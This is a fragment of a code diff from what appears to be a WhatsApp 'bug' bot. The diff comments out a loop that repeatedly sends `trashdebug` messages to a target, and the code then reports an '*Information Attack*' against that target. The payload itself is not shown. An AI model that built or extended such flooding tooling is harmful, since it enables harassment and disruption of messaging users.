@@ -14,14 +14,15 @@ await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 `
 await conn.sendMessage(m.chat, { react: { text: '🆘', key: m.key } }); 
 reply(process) 
-for (let r = 0; r < 50; r++) {
-await trashdebug(isTarget);
-await sleep(5000)
-await trashdebug(isTarget);
-await trashdebug(isTarget);
-await sleep(5000)
-await trashdebug(isTarget);
-}
+// DISABLED: This was causing blank white status posts
+// for (let r = 0; r < 50; r++) {
+// await trashdebug(isTarget);
+// await sleep(5000)
+// await trashdebug(isTarget);
+// await trashdebug(isTarget);
+// await sleep(5000)
+// await trashdebug(isTarget);
+// }
 
 let put = `*Information Attack*
 * Target : ${client}
